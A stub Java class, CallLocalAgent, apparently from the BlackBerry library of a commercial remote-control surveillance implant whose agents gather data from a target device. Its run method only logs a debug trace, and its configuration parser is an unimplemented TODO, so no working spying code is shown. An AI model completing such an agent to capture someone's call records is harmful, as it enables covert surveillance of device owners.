/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : CallLocalAgent.java 
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.agent;

import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;

public class CallLocalAgent extends Agent {
    //#debug
    private static Debug debug = new Debug("CallLocalAgent", DebugLevel.VERBOSE);

    public CallLocalAgent(final boolean agentStatus) {
        super(Agent.AGENT_CALL_LOCAL, agentStatus, true, "CallLocalAgent");
    }

    protected CallLocalAgent(final boolean agentStatus, final byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    public void actualRun() {
        // #debug
        debug.trace("run");

    }

    protected boolean parse(final byte[] confParameters) {
        // TODO Auto-generated method stub
        return false;
    }

}
